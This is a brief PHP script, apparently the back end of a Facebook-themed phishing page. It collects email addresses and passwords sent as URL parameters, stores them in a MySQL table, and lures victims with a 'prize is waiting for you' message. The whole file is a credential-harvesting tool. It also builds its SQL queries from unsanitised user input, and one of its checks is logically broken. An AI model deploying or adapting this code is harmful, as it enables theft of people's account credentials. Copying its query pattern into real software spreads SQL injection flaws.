<?php
$conn = mysqli_connect("localhost","root","","facebook");
if($conn){
    $email = $_GET["email"];
    $password = $_GET["password"];
    $sql1 = mysqli_query($conn,"SELECT `Password` FROM `details` WHERE Password = '$password'");
    $sql2 = mysqli_query($conn,"SELECT `Email or Phone Number` FROM `details` WHERE 'Email or Phone Number' = '$password'");
    $sql = "INSERT INTO `details`(`Email or Phone Number`, `Password`) VALUES ('$email','$password')";
    if(mysqli_num_rows($sql1)==0){
        if(mysqli_num_rows($sql2)==0){
        if(mysqli_query($conn,$sql)){
            echo "your email and password has been saved.";
        }
        else{
         echo "go back and try again. prize is waiting for you.";
        }
    }
}
    else{ echo "already entered the value.";
    }
}
else{
    die("Connection Error!".mysqli_connect_error());
}
?>